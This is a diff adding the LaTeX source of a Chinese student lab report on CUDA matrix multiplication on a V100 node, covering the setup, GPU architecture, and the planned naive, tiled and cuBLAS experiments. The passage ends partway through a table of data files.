@@ -1,0 +1,849 @@
+\documentclass[zihao=-4]{ctexart}
+\usepackage[normalem]{ulem}
+\useunder{\uline}{\ul}{}
+%********************导言区宏包引入********************
+\usepackage{xeCJK}
+\usepackage{amssymb}
+\usepackage{amsmath}
+\usepackage{listings} %代码
+\usepackage{graphicx}
+\usepackage{multicol} %回车换段
+\usepackage{xcolor}
+\usepackage{geometry} %页面设置
+\usepackage{fontspec}
+\usepackage{setspace}
+\usepackage{times}
+\usepackage{fancyhdr} %页眉页脚
+\pagestyle{fancy}
+\usepackage{float} %表格位置
+\usepackage{titlesec} %设置
+\usepackage{titletoc}
+\usepackage{ctex}
+\usepackage{gbt7714}    %控制参考文献格式为国标
+\usepackage{multirow}
+\usepackage{booktabs}   %表格相关
+\usepackage{setspace}   %设置行距
+\usepackage{caption} %caption
+\usepackage{subcaption} %子图的caption
+\usepackage{changepage} %左右缩进
+\usepackage{xurl}
+\def\UrlBreaks{%
+    \do\/%
+    \do\a\do\b\do\c\do\d\do\e\do\f\do\g\do\h\do\i\do\j\do\k\do\l%
+    \do\m\do\n\do\o\do\p\do\q\do\r\do\s\do\t\do\u\do\v\do\w\do\x\do\y\do\z%
+    \do\A\do\B\do\C\do\D\do\E\do\F\do\G\do\H\do\I\do\J\do\K\do\L%
+    \do\M\do\N\do\O\do\P\do\Q\do\R\do\S\do\T\do\U\do\V\do\W\do\X\do\Y\do\Z%
+    \do0\do1\do2\do3\do4\do5\do6\do7\do8\do9\do=\do/\do.\do:%
+    \do\*\do\-\do\~\do\'\do\"\do\-}
+\urlstyle{same}
+
+
+% for 代码
+\definecolor{mygreen}{rgb}{0,0.6,0}
+\definecolor{mygray}{rgb}{0.5,0.5,0.5}
+\definecolor{mymauve}{rgb}{0.58,0,0.82}
+
+
+\graphicspath{ {include_picture/} }
+\let\algorithm\relax
+\let\endalgorithm\relax
+\usepackage[ruled,vlined]{algorithm2e}%[ruled,vlined]{
+\usepackage{algpseudocode}
+\renewcommand{\algorithmicrequire}{\textbf{Input:}} 
+\renewcommand{\algorithmicensure}{\textbf{Output:}}
+%\renewcommand\thepage{\zihao{-5} ~\arabic{page}~}%页码字号
+
+%定义两个arg
+\DeclareMathOperator*{\argmax}{arg\,max}
+\DeclareMathOperator*{\argmin}{arg\,min}
+\DeclareCaptionLabelSeparator{mysep}{\space\space}  %自定义caption格式
+\captionsetup[figure]{font={small}, labelfont=bf, labelsep=mysep, textfont=bf}   %图片caption格式
+\captionsetup[table]{font={small}, labelfont=bf, labelsep=mysep, textfont={bf}}   %表格caption格式
+\bibliographystyle{gbt7714-numerical} %修改了title斜体内容
+
+\usepackage[colorlinks,bookmarksopen,bookmarksnumbered,citecolor=blue, urlcolor=blue]{hyperref}
+\hypersetup{
+    linkcolor=black
+}
+
+%********************导言区宏包引入********************
+%********************第三方字体引入********************
+%\setCJKmainfont[Path=fonts/,BoldFont=simhei.ttf,ItalicFont=simkai.ttf,SlantedFont=simfang.ttf]{simsun.ttc}
+%中文字体涵盖黑体、宋体、楷体、仿宋
+\setmainfont[Path=fonts/, 
+BoldFont = times-new-roman-bold.ttf,
+ItalicFont = times-new-roman-italic.ttf,
+BoldItalicFont = times-new-roman-bold-italic.ttf
+]{times-new-roman.ttf}
+\setmonofont[Path=fonts/]{Courier New.ttf}
+\setCJKfamilyfont{hwzs}[Path=fonts/]{STKzhongsong.ttf}%使用STZhogsong华文中宋字体
+\newcommand{\zhongsong}{\CJKfamily{hwzs}}
+\setCJKfamilyfont{hwxw}[Path=fonts/]{STKxinwei.ttf} % XSP 2023/3/3:
+\newcommand{\xinwei}{\CJKfamily{hwxw}}              %  使用STZxinwei华文新魏字体.
+
+%********************第三方字体引入********************
+
+
+%********************中文字号设置********************
+%\newcommand{\chuhao}{\fontsize{42pt}{\baselineskip}\selectfont}
+\newcommand{\chuhao}{\fontsize{42pt}{0}}
+\newcommand{\xiaochu}{\fontsize{36pt}{0}}
+\newcommand{\yihao}{\fontsize{28pt}{0}}
+\newcommand{\erhao}{\fontsize{21pt}{0}}
+\newcommand{\xiaoer}{\fontsize{18pt}{0}}
+\newcommand{\sanhao}{\fontsize{16pt}{0}}
+\newcommand{\sihao}{\fontsize{14pt}{0}}
+\newcommand{\xiaosi}{\fontsize{12pt}{0}}
+\newcommand{\wuhao}{\fontsize{10.5pt}{0}}
+\newcommand{\xiaowu}{\fontsize{9pt}{0}}
+\newcommand{\liuhao}{\fontsize{8pt}{0}}
+\newcommand{\qihao}{\fontsize{5.25pt}{0}}
+
+% 个人信息 自定义命令 固定长度下划线
+\newcommand\ful[2][4cm]{\underline{\makebox[#1][c]{#2}}}
+%********************中文字号设置********************
+
+
+%********************代码段********************
+% https://www.cnblogs.com/PiaYie/p/15720770.html
+\renewcommand{\lstlistingname}{代码}
+\lstset{ %
+  backgroundcolor=\color{white},   % choose the background color; you must add \usepackage{color} or \usepackage{xcolor}
+  basicstyle=\footnotesize,        % the size of the fonts that are used for the code
+  breakatwhitespace=false,         % sets if automatic breaks should only happen at whitespace
+  breaklines=true,                 % sets automatic line breaking
+  captionpos=bl,                    % sets the caption-position to bottom
+  commentstyle=\color{mygreen},    % comment style
+  deletekeywords={...},            % if you want to delete keywords from the given language
+  escapeinside={\%*}{*)},          % if you want to add LaTeX within your code
+  extendedchars=true,              % lets you use non-ASCII characters; for 8-bits encodings only, does not work with UTF-8
+  frame=single,                    % adds a frame around the code
+  keepspaces=true,                 % keeps spaces in text, useful for keeping indentation of code (possibly needs columns=flexible)
+  keywordstyle=\color{blue},       % keyword style
+  %language=Python,                 % the language of the code
+  morekeywords={*,...},            % if you want to add more keywords to the set
+  numbers=left,                    % where to put the line-numbers; possible values are (none, left, right)
+  numbersep=5pt,                   % how far the line-numbers are from the code
+  numberstyle=\tiny\color{mygray}, % the style that is used for the line-numbers
+  rulecolor=\color{black},         % if not set, the frame-color may be changed on line-breaks within not-black text (e.g. comments (green here))
+  showspaces=false,                % show spaces everywhere adding particular underscores; it overrides 'showstringspaces'
+  showstringspaces=false,          % underline spaces within strings only
+  showtabs=false,                  % show tabs within strings adding particular underscores
+  stepnumber=1,                    % the step between two line-numbers. If it's 1, each line will be numbered
+  stringstyle=\color{orange},     % string literal style
+  tabsize=2,                       % sets default tabsize to 2 spaces
+  literate={-}{{\textendash}}{1}
+  %title="No name code"                   % show the filename of files included with \lstinputlisting; also try caption instead of title
+}
+%********************代码段********************
+
+
+%********************页边距设置********************
+\geometry{left=3cm,right=2cm,top=2.5cm,bottom=2.5cm}
+\geometry{a4paper} % xsp 2023/3/7: 调整纸张大小为A4
+%********************页边距设置********************
+
+%********************段间距设置********************
+\newcommand{\setParDis}{\setlength {\parskip} {0pt} }
+%请在每部分使用这个
+%********************段间距设置********************
+
+%********************
+
+\begin{document}
+%********************页眉页脚设置********************
+\lhead{}%设置左页眉为空
+\rhead{}%设置左页眉为空
+\setlength{\headwidth}{\textwidth}% 2023/3/3 XSP: 页眉长度适应文本
+%********************页眉页脚设置********************
+
+
+%********************标题格式设置********************
+
+%\setcounter{secnumdepth}{0}%该命令取消了章标题前数字label
+
+\CTEXsetup[name={,、},number={\chinese{section}}]{section}
+\CTEXsetup[name={（,）},number={\chinese{subsection}}]{subsection}
+\CTEXsetup[name={,.},number={\arabic{subsubsection}}]{subsubsection}% 不加会导致目录格式错误
+% 设置subsubsection等格式
+% \titleformat{\section}[block]{\sanhao\bfseries\centering}{\chinese{section}、}{0pt}{}[]
+% \titleformat{\subsection}[block]{\sihao\bfseries}{（\chinese{subsection}）}{0pt}{}[]
+% \titleformat{\subsubsection}[block]{\xiaosi\bfseries}{\arabic{subsubsection}、}{0pt}{}[]
+\titleformat{\section}[block]{\sanhao\heiti\centering}{\chinese{section}、}{0pt}{}[]    % XSP 2023/3/3:
+\titleformat{\subsection}[block]{\sihao\heiti}{（\chinese{subsection}）}{0pt}{}[]       %   将正文标题字体由加粗
+\titleformat{\subsubsection}[block]{\xiaosi\heiti}{\arabic{subsubsection}.}{0pt}{}[]   % 修改为黑体。
+\titlespacing{\section}{0pt}{25pt}{12pt}
+\titlespacing{\subsection}{0pt}{7pt}{7pt}
+\titlespacing{\subsubsection}{0pt}{5pt}{4pt}
+
+\titlecontents{section}[1.6em]{\addvspace{2pt}\filright}
+{\contentspush{\thecontentslabel\hspace{0.8em}}}
+{}{\titlerule*[8pt]{.}\contentspage}
+
+\titlecontents{subsection}[3.2em]{\addvspace{2pt}\filright}
+{\contentspush{\thecontentslabel\hspace{0.8em}}}
+{}{\titlerule*[8pt]{.}\contentspage}
+
+\titlecontents{subsubsection}[6.4em]{\addvspace{2pt}\filright}
+{\contentspush{\thecontentslabel\hspace{0.8em}}}
+{}{\titlerule*[8pt]{.}\contentspage}
+%********************标题格式设置********************
+
+%\setcounter{section}{-3}  %标题计数器
+%\stepcounter{section}
+
+%*******************行间距段前段后*******************
+\linespread{1.8}
+%行间距为实际行间距乘以1.2,如此处实际为1.5倍行距
+\setlength{\parskip}{0.5\baselineskip}
+%*******************行间距段前段后*******************
+
+
+
+%********************封面部分********************
+%
+%     论文题目：应准确、鲜明、简洁，能概括整个论文中最主要和最重要的内容。
+% 题目不超过20个中文字，若语意未尽，可用副标题补充说明。副标题应处于从属
+% 地位，一般可在题目的下一行用破折号“——”引出。论文题目应避免使用不常用缩
+% 略词、首字母缩写字、字符、代号和公式等。
+%
+% \def\Fengru{第三十四届“冯如杯”竞赛主赛道}
+\def\CourseName{《并行程序设计A》}
+\leftline{\includegraphics[scale=1]{include_picture/xiaohui.png}} % XSP 2023/3/3: 取消校徽段首缩进
+%格式控制部分
+% \par \  
+% \par \
+% \par \
+\vspace{32pt}
+\begin{center}
+\includegraphics[height=2.25cm, width=12.78cm, scale=1]{include_picture/xiaoming.png}
+\end{center}
+%格式控制部分
+\vspace{12pt}
+
+\begin{spacing}{3}
+    % \erhao
+    \begin{center}
+      {
+        \fontsize{22pt}{3}\selectfont
+        \zhongsong{GPU矩阵相乘实验报告} %黑体这样调用，其余字体同理
+      } 
+        % \zhongsong{“冯如杯”竞赛主赛道项目是什么}
+    \end{center}
+    \rightline{\xinwei\sanhao{\CourseName 课程报告}} % XSP 2023/3/3: 副标题二号华文新魏居右
+
+    \vspace{2cm}
+    \begin{center}
+    \textbf{\sanhao
+        \makebox[2cm][s]{学院}：\ful[5cm]{软件学院}\\
+        \makebox[2cm][s]{班级}：\ful[5cm]{ZY25211}\\
+        \makebox[2cm][s]{姓名}：\ful[5cm]{刘益洲}\\
+        \makebox[2cm][s]{学号}：\ful[5cm]{ZY2521110}\\
+    }
+    \end{center}
+
+\end{spacing}
+%格式控制部分
+% \par \ 
+% \par \
+% \par \ 
+% \par \
+% \par \ 
+% \par \
+% \begin{center}
+%     \sihao
+%     \textbf{学院：计算机学院}
+%     \par \ 
+%     \textbf{本模板原作者：Someday}
+% \end{center}
+
+%格式控制部分
+\par \ 
+\begin{center}
+\sanhao
+\centerline{\heiti{}}%封面年月去掉
+\end{center}
+
+\pagenumbering{gobble} %封面无页码
+%\thispagestyle{empty}
+
+
+\renewcommand{\headrulewidth}{0pt}%没有页眉装饰线
+\clearpage
+\pagenumbering{roman} %摘要目录页小写罗马
+ 
+
+%********************目录部分********************
+\clearpage
+\tableofcontents
+\clearpage
+%********************目录部分********************
+
+
+
+\renewcommand{\headrulewidth}{0.4pt} %恢复页眉装饰线
+
+%********************正文页眉部分********************
+%\lhead{} 
+\chead{\xiaowu \CourseName 课程报告} %设置居中页眉
+%********************正文页眉部分********************
+
+\pagenumbering{arabic} %正文页码从1开始，用阿拉伯数字
+\setcounter{page}{1} 
+
+\section{实验环境}
+\setParDis %设置段间距为 0
+\begin{spacing}{1.5}
+
+本实验在表~\ref{tab:exp-env}所列硬件与表~\ref{tab:exp-sw}所列软件环境下完成；硬件信息由实验节点 \texttt{dell-65} 通过 \texttt{lscpu}、\texttt{free} 与 \texttt{nvidia-smi} 读取，软件信息通过 \texttt{nvcc --version}、\texttt{ncu --version} 及 \texttt{/usr/local/cuda/version.json} 等命令查询得到。矩阵乘法与性能测试均在\textbf{单块 GPU}（\texttt{CUDA\_VISIBLE\_DEVICES=0}）上执行。
+
+\begin{table}[H]
+\small
+\centering
+\caption{实验节点硬件环境}
+\label{tab:exp-env}
+\begin{tabular}{lp{9.2cm}}
+\toprule
+\textbf{项目} & \textbf{规格或说明} \\
+\midrule
+主机名 & dell-65 \\
+服务器型号 & Dell PowerEdge C4140 \\
+处理器 & 2$\times$ Intel Xeon Gold 6148 @ 2.40GHz \\
+逻辑处理器数量 & 80 \\
+内存容量 & 约 252 GB（251 GiB） \\
+图形处理器 & 4$\times$ NVIDIA Tesla V100-SXM2-32GB \\
+计算能力 & 7.0 \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\begin{table}[H]
+\small
+\centering
+\caption{实验节点软件环境}
+\label{tab:exp-sw}
+\begin{tabular}{lp{9.2cm}}
+\toprule
+\textbf{项目} & \textbf{规格或说明} \\
+\midrule
+操作系统 & Ubuntu 22.04.5 LTS（Jammy Jellyfish） \\
+内核版本 & Linux 5.15.0-177-generic（x86\_64） \\
+NVIDIA 驱动 & 580.159.03（\texttt{nvidia-smi} 报告的 Driver Version） \\
+驱动支持的 CUDA 版本 & 13.0（\texttt{nvidia-smi} 顶部 CUDA Version 字段） \\
+CUDA Toolkit & 12.6.3（安装路径 \texttt{/usr/local/cuda}） \\
+CUDA 编译器 & \texttt{nvcc} 12.6.85（CUDA 12.6） \\
+Nsight Compute（默认） & \texttt{/usr/local/cuda/bin/ncu}，版本 2026.1.1.0；\texttt{ncu --list-chips} 中已不含 \texttt{gv100}，无法在 V100 上 profiling \\
+Nsight Compute（实验用） & \texttt{/opt/nvidia/nsight-compute/2024.3.2/ncu}，版本 2024.3.2.3；支持 Volta（V100），用于 \texttt{make ncu-*} \\
+Nsight Systems（默认） & \texttt{/usr/local/cuda/bin/nsys} 未随 CUDA 12.6 Toolkit 完整安装，直接调用报错 \\
+Nsight Systems（实验用） & \texttt{/opt/nvidia/nsight-systems/2024.2.3/bin/nsys}，版本 2024.2.3.38；可用于 V100 时间线采集，用于 \texttt{make nsys-*} \\
+主机 C/C++ 编译器 & GCC/G++ 11.4.0（Ubuntu 11.4.0-1ubuntu1\textasciitilde 22.04.3） \\
+构建工具 & GNU Make 4.3 \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+
+\section{NVIDIA GPU体系结构与CUDA编程模型}
+
+在进入 GPU 矩阵相乘实验之前，我们首先需要对NVIDIA GPU体系结构以及CUDA编程模型建立基本的了解。
+
+\subsection{NVIDIA GPU硬件结构}
+
+NVIDIA GPU硬件包含以下几个主要结构：GPU处理集群（GPU Processing Clusters，GPC）、纹理处理集群（Texture Processing Clusters，TPC）、流式多处理器（Streaming Multiprocessors，SM）和CUDA核心（Streaming Processor，SP）。
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\textwidth]{plots/nvidia_cuda_ga100_overview.png}
+    \caption{NVIDIA GA100核心全景图}
+    \label{fig:nvidia-ga100-overview}
+\end{figure}
+
+图~\ref{fig:nvidia-ga100-overview}（NVIDIA，2020）展示了Ampere架构GPU核心GA100的结构。GPC是NVIDIA GPU架构中最高级别的结构单元，负责处理大量并行任务，实现高吞吐量的计算能力，其中包含若干TPC和其他一些共享资源，例如L2缓存。TPC是次一级的集群，主要负责处理纹理相关的计算任务。它包含若干SM，后者负责执行具体的CUDA线程块，其结构如图~\ref{fig:nvidia-ga100-sm}所示，包含四个SMSPs（SM sub partitions），是SM上的主要处理单元，管理一个固定大小的warp池。而SMSPs具有若干CUDA核心、调度器（scheduler）、寄存器堆、共享内存和其他辅助硬件。CUDA核心是最基本的计算单元，执行CUDA程序中的线程指令，分为不同类型，包括执行浮点运算的FP32和FP64核心、执行整数运算的INT32核心，以及进行深度学习加速运算的张量计算核心（Tensor Cores）。每个SM包含的CUDA核心数量通常较多，这使得GPU能够高效地执行并行计算任务。当计算一款GPU的CUDA核心总数时，通常统计其FP32核心的总数，因为FP32运算是GPU中最为常见的运算类型。
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.72\textwidth]{plots/nvidia_cuda_ga100_sm.png}
+    \caption{GA100核心SM结构图}
+    \label{fig:nvidia-ga100-sm}
+\end{figure}
+
+\subsection{CUDA编程模型}
+
+本小节将对CUDA编程模型中的kernel核函数、线程层次结构、存储层次结构以及同步操作进行简要介绍。
+
+在CUDA编程模型中，kernel核函数是在GPU设备上执行的并行计算单元，其核心设计思想是将计算任务分解为大量可同时执行的线程。与CPU上的顺序执行函数不同，kernel核函数在调用时需要指明线程组织方式，表明执行该核函数所需的线程数量和结构。每个线程独立执行核函数逻辑，通过线程索引访问输入数据或控制计算行为，从而实现数据并行或任务并行计算。
+
+在计算能力9.0之前，CUDA的线程层次结构采用三级组织方式：最外层为线程网格（Grid），中间层为线程块（Block），最内层为线程（Thread），如图~\ref{fig:nvidia-cuda-thread-hierarchy}（a）（NVIDIA，2023）所示。Grid由Block组成，Block由Thread组成，其形状由\texttt{dim3}类型的参数指定，支持一维、二维或三维布局，但其大小受具体GPU计算能力的限制。而在计算能力9.0中，NVIDIA在Block和Grid之间引入了一个新的层级线程块集群（Thread Block Cluster），如图~\ref{fig:nvidia-cuda-thread-hierarchy}（b）（NVIDIA，2023）所示。
+
+\begin{figure}[H]
+    \centering
+    \begin{subfigure}{0.48\textwidth}
+        \centering
+        \includegraphics[width=\linewidth]{plots/nvidia_cuda_thread_hierarchy_ampere.png}
+        \caption{Ampere架构线程层次结构图}
+        \label{fig:nvidia-cuda-thread-hierarchy-ampere}
+    \end{subfigure}
+    \hspace*{\fill}
+    \begin{subfigure}{0.48\textwidth}
+        \centering
+        \includegraphics[width=\linewidth]{plots/nvidia_cuda_thread_hierarchy_hopper.png}
+        \caption{Hopper架构线程层次结构图}
+        \label{fig:nvidia-cuda-thread-hierarchy-hopper}
+    \end{subfigure}
+    \caption{CUDA线程层次结构图}
+    \label{fig:nvidia-cuda-thread-hierarchy}
+\end{figure}
+
+在执行时，Block Cluster中所有线程共同调度到一个GPC上，而Block中所有线程将会以32个为一组划分到不同warp，被调度到同一个SM中。warp是NVIDIA GPU调度的基本单位，其中所有线程以SIMD（单指令流多数据流）方式执行相同指令。
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.82\textwidth]{plots/nvidia_cuda_memory_hierarchy.png}
+    \caption{CUDA存储层次结构图}
+    \label{fig:nvidia-cuda-memory-hierarchy}
+\end{figure}
+
+存储层次结构是CUDA编程模型的另一核心要素，其设计旨在平衡访存速度与存储容量和可见范围，如图~\ref{fig:nvidia-cuda-memory-hierarchy}（NVIDIA，2025）所示。其中容量最大的为全局内存（Global Memory），能够被所有核函数访问，但其延迟较高。\texttt{cudaMemcpy()}系列函数可以在主机和设备的全局内存间进行数据拷贝。同样被所有核函数共用的还包括纹理内存（Texture Memory）与常量内存（Constant Memory），这二者均为只读缓存型内存，前者针对二维数据寻址优化，支持硬件级数据插值；后者适用于核函数中频繁访问的常量数据，通过缓存机制减少全局内存访问次数。而共享内存（Shared Memory）则是隶属于线程块的高速存储单元，容量和访问延迟均显著小于全局内存，位于SM内部，其作用域限于当前线程块内的所有线程。寄存器（Register）是每个线程独占的最快存储单元，用于存储线程私有临时变量，寄存器的分配由编译器自动管理。此外，在计算能力9.0以上的架构中，在全局内存和共享内存之间，还有一层分布式共享内存（Distributed Shared Memory），比全局内存更快，作用域限于同一线程块集群中的线程。
+
+最后，CUDA提供了多个同步函数，用于控制核函数的执行顺序和数据一致性。\texttt{cudaDeviceSynchronize()}函数用于在主机代码中同步设备操作，确保之前启动的所有核函数在继续执行主机代码之前完成；而\texttt{\_\_syncthreads()}则是一个内置的线程块级别的同步函数，在核函数中使用，用于在线程块内同步所有线程，每个线程在继续执行之前，都会等待所有线程都到达同步点。
+
+此外，在CUDA程序设计和性能分析中，Stream和Context的概念也同样重要。
+
+Stream是CUDA中用于管理异步操作的关键机制。它就像是一条任务流水线，在这个流水线里可以有序地安排各种CUDA操作，像核函数的调用、内存的拷贝等。每个Stream内的操作是按顺序依次异步执行的，不同Stream之间的操作可以并行开展。
+
+Context可以看作是CUDA设备的一个独立运行环境。它包含了CUDA程序运行所需的各种状态信息，如内存分配情况、内核函数的编译状态等，每个Context都有自己独立的资源和状态。Context就像是一个容器，把不同的CUDA任务隔离开来。
+
+Stream和Context，在某些方面类似于CPU程序设计概念中的线程和进程。
+
+
+
+
+
+
+\section{实验内容与方法}
+
+本实验在实验节点裸机上完成 CUDA 程序的开发、运行与性能分析，不依赖容器环境。实验采用渐进式路线：先实现仅使用全局内存的朴素 GPU 矩阵乘法 kernel，借助 Nsight Compute（\texttt{ncu}）观察其性能特征与瓶颈；再在此基础上引入共享内存分块等优化，复测并对比分析。除自研实现外，使用 cuBLAS 生成标准结果并作为性能对照上界。各阶段均使用预先准备的固定测试矩阵，以保证结果可复现、计时可比。
+
+\subsection{计算问题与数据类型}
+
+实验求解双精度方阵乘法
+\begin{equation}
+  C = A \times B,\quad A,B,C \in \mathbb{R}^{N \times N}.
+\end{equation}
+矩阵在主机端与设备端均按\textbf{行主序}（row-major）连续存储。自研 kernel 与 cuBLAS 调用采用相同数据类型（\texttt{double}），以便正确性比对与性能对比具有可比性。
+
+对稠密矩阵乘法而言，在相同 $N$ 与数据类型下，矩阵元素的具体数值不改变运算规模与访存模式，因此\textbf{随机矩阵的取值不影响 GPU 计算性能}；实验只需固定随机种子以保证可复现。本实验不涉及稀疏矩阵存储或稀疏 kernel，矩阵中零元素的比例不作为实验变量。
+
+\subsection{测试数据准备}
+
+为避免在每次性能测试时重复进行耗时的主机端矩阵乘法，实验在\textbf{数据准备阶段}一次性完成以下工作：
+
+\begin{enumerate}
+  \item 给定固定随机种子，为若干组矩阵规模 $N$ 分别生成 $A$、$B$，并以二进制格式落盘保存；
+  \item 调用 cuBLAS（\texttt{cublasDgemm}）在 GPU 上计算 $C_{\mathrm{ref}} = A \times B$，将参考结果同样落盘保存；
+  \item 后续 benchmark 仅读取已保存的 $A$、$B$（及校验所需的 $C_{\mathrm{ref}}$），不再重新生成数据或重复计算参考结果。
+\end{enumerate}
+
+计划覆盖的矩阵规模如表~\ref{tab:matmul-sizes} 所示（可在实现阶段根据显存与耗时微调）。各 $N$ 对应一组固定的 $(A,B,C_{\mathrm{ref}})$，所有 kernel 与 cuBLAS 均复用同一组输入。
+
+\begin{table}[H]
+\small
+\centering
+\caption{计划测试的方阵规模}
+\label{tab:matmul-sizes}
+\begin{tabular}{cc}
+\toprule
+\textbf{规模 $N$} & \textbf{说明} \\
+\midrule
+512  & 小规模，便于快速验证正确性 \\
+1024 & 中等规模，适合 \texttt{ncu} 深入分析 \\
+2048 & 中等偏大 \\
+4096 & 大规模 \\
+8192 & 大规模，考察访存与占用率 \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\subsection{自研 kernel 设计}
+
+自研实现采用\textbf{一个 kernel 覆盖多种矩阵规模}的方式：在主机代码中根据 $N$ 计算网格与线程块维度（含对不整除 tile 的边界处理），再启动相应 kernel，而非为每个 $N$ 单独编写核函数。
+
+\subsubsection{朴素全局内存 kernel（阶段一）}
+
+第一阶段实现不使用共享内存的 naive kernel。每个线程负责计算 $C$ 中一个元素 $C_{row,col}$，内层对 $k=0,\ldots,N-1$ 累加 $A_{row,k}\cdot B_{k,col}$，所需数据均直接从全局内存读取。
+
+该 kernel 的主要目的在于：（1）完成 CUDA 内存分配、数据传输与 kernel 启动的基本流程；（2）建立后续优化前的性能 baseline；（3）通过 \texttt{ncu} 观察典型 memory-bound 行为（如全局访存过多、合并度不足、内存延迟导致的 stall 等）。线程块大小在实现阶段选取常用配置（如 $16\times 16$），并在各 $N$ 下保持一致以便对比。
+
+\subsubsection{共享内存分块 kernel（阶段二）}
+
+第二阶段在 naive 实现基础上引入\textbf{共享内存（Shared Memory）分块}优化。将 $A$、$B$ 的子块载入线程块内的共享内存，在 tile 内复用数据，减少对全局内存的重复访问；块内使用 \texttt{\_\_syncthreads()} 保证协作加载与计算的正确顺序。对 $N$ 不能整除 tile 大小的边界情形，在 kernel 内通过条件判断处理部分 tile。
+
+tile 宽度（如 $16$ 或 $32$）作为编译期常量或可调参数，在实验中对各 $N$ 采用统一配置；若后续 profiling 显示 occupancy 或 bank conflict 存在问题，可在报告中讨论 padding 等进一步改进方向，但不作为本实验的必需步骤。
+
+\subsection{cuBLAS 对照实验}
+
+除自研 kernel 外，实验调用 cuBLAS 中的 \texttt{cublasDgemm} 完成同一组 $(A,B)$ 上的矩阵乘法，承担两类角色：
+
+\begin{itemize}
+  \item \textbf{标准结果}：数据准备阶段生成的 $C_{\mathrm{ref}}$ 作为 gold standard，用于校验 naive 与 tiled kernel 的数值正确性；
+  \item \textbf{性能上界参照}：在同一硬件与数据规模下，将 cuBLAS 的 GPU 计算耗时作为工业级优化实现的参照，衡量自研 kernel 与库函数之间的差距。
+\end{itemize}
+
+调用 cuBLAS 时需注意其默认列主序约定：通过合理设置转置标志或等价变换，使 \texttt{cublasDgemm} 与自研 kernel 在\textbf{相同的行主序布局与 leading dimension} 下计算同一问题，避免因存储约定不同导致结果或性能不可比。
+
+\subsection{正确性验证方法}
+
+对每个规模 $N$ 与每种实现，在性能计时之外单独进行正确性检查：将 GPU 计算得到的 $C$ 与已保存的 $C_{\mathrm{ref}}$ 逐元素比较。由于浮点累加顺序不同，允许存在舍入误差，采用最大相对误差等指标判定：
+\begin{equation}
+  \mathrm{err}_{\mathrm{rel}} = \max_{i,j}\frac{|C_{ij}-C_{\mathrm{ref},ij}|}{|C_{\mathrm{ref},ij}|+\varepsilon},
+\end{equation}
+其中 $\varepsilon$ 为极小正数以防除零。仅当误差低于预设阈值时，认为该实现通过验证。正确性校验不计入 kernel 性能计时段。
+
+\subsection{性能测试方法}
+
+性能测试在单块 GPU 上独立进行（如设置 \texttt{CUDA\_VISIBLE\_DEVICES=0}），避免多用户争用干扰计时。采用 CUDA 事件（\texttt{cudaEvent}）测量\textbf{GPU 端矩阵乘法核函数执行时间}（含 cuBLAS 调用中与计算直接相关的部分）；主机端数据生成、文件读写与结果校验均不计入计时。
+
+具体流程如下：
+
+\begin{enumerate}
+  \item 将 $A$、$B$ 拷贝至设备端（若实验设计为“数据已在 GPU”，则可在预热阶段完成拷贝，计时仅包围 kernel 或 \texttt{cublasDgemm} 本体，并在报告中明确说明）；
+  \item 执行若干次 warmup，使 GPU 进入稳定状态；
+  \item 重复运行多次，取平均时间作为该 $(N,\ \text{实现})$ 的最终耗时；
+  \item 对 naive kernel、tiled kernel 与 cuBLAS 在\textbf{相同 $N$ 与相同输入}下分别测时，计算 tiled 相对 naive 的加速比，以及自研实现相对 cuBLAS 的性能比。
+\end{enumerate}
+
+\subsection{性能分析方法}
+
+使用 Nsight Compute（\texttt{ncu}）对代表性规模（如 $N=1024$ 与 $N=4096$）分别 profile 朴素 kernel 与共享内存 kernel，重点观察并对比以下指标：
+
+\begin{itemize}
+  \item 全局内存吞吐量（Memory Throughput）与访存效率；
+  \item 计算吞吐量（Compute Throughput）与 SM 占用率（Achieved Occupancy）；
+  \item warp stall 原因（如 Memory Dependency、Long Scoreboard 等）；
+  \item 共享内存优化后全局 load/store 是否减少，occupancy 是否因 shared memory 用量发生变化。
+\end{itemize}
+
+通过``实现优化前 $\rightarrow$ 实现优化后''的对比，结合 \texttt{ncu} 报告解释 shared memory 分块为何能缓解 naive kernel 中的 memory-bound 瓶颈；性能曲线与 profiling 结果留待第~\ref{sec:exp-result} 节给出。
+
+\subsection{实验对比维度小结}
+
+表~\ref{tab:exp-compare} 归纳本实验的主要对比关系。
+
+\begin{table}[H]
+\small
+\centering
+\caption{实验对比维度}
+\label{tab:exp-compare}
+\begin{tabular}{lll}
+\toprule
+\textbf{对比项} & \textbf{对象} & \textbf{目的} \\
+\midrule
+优化效果 & naive kernel vs.\ tiled kernel & 量化 shared memory 优化收益 \\
+性能上界 & 自研实现 vs.\ cuBLAS & 衡量与库函数的性能差距 \\
+瓶颈分析 & 优化前 vs.\ 优化后（\texttt{ncu}） & 解释性能变化原因 \\
+规模扩展 & 不同 $N$ 下上述对比 & 观察规模对性能与瓶颈的影响 \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+
+\section{实验过程}
+
+\subsection{测试数据生成}
+
+本实验为各矩阵规模预先固定一组 $(A,B,C_{\mathrm{ref}})$ 并落盘保存，使后续各矩阵乘法实现与 cuBLAS 能在相同输入上对比正确性与性能，并避免在性能测试时重复生成随机矩阵或计算参考结果；对于稠密方阵乘法，在相同 $N$ 与数据类型下，矩阵元素的具体取值不改变运算次数与访存模式，因此对我们自己实现的矩阵乘法程序而言，性能测量结果理论上不随具体数据值而改变。
+
+\subsubsection{目录与程序组织}
+
+测试数据及其生成代码均置于 \texttt{final/data/} 目录下，主要文件如表~\ref{tab:data-files} 所示。其中 \texttt{mat\_data.h} 定义二进制文件格式，供各程序共用；\texttt{gen\_data.c} 为纯主机端 C 程序，不依赖 CUDA 或 cuBLAS，负责生成随机矩阵 $A$、$B$ 并写入 \texttt{N\{N\}.bin}；\texttt{mat\_io.c} 提供读写接口，供参考结果生成与后续 benchmark 复用。
+
+\begin{table}[H]
+\small
+\centering
+\caption{测试数据目录中的主要文件}
+\label{tab:data-files}
+\begin{tabular}{lp{8.8cm}}
+\toprule
+\textbf{路径} & \textbf{说明} \\
+\midrule
+\texttt{data/mat\_data.h} & 输入/参考结果文件头结构与 magic 常量 \\
+\texttt{data/mat\_io.c}、\texttt{data/mat\_io.h} & 读写 \texttt{N\{N\}.bin} 与 \texttt{N\{N\}\_cref.bin} 的公共接口 \\
